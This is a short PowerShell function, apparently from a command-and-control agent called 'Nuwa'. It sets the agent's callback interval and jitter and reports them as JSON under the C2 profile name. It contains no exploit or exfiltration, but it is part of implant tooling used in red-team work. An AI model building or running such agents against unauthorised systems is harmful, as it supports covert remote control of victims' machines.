function Invoke-NuwaSleep {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [hashtable]$Parameters
    )

    $script:NuwaConfig.CallbackInterval = [int]$Parameters.interval
    if ($Parameters.ContainsKey('jitter')) {
        $script:NuwaConfig.CallbackJitter = [int]$Parameters.jitter
    }

    $profileName = if ($script:NuwaConfig.ContainsKey('C2Profile') -and -not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
        [string]$script:NuwaConfig.C2Profile
    } else {
        'http'
    }

    return (@{
        $profileName = @{
            interval = $script:NuwaConfig.CallbackInterval
            jitter = $script:NuwaConfig.CallbackJitter
        }
    } | ConvertTo-Json -Compress)
}
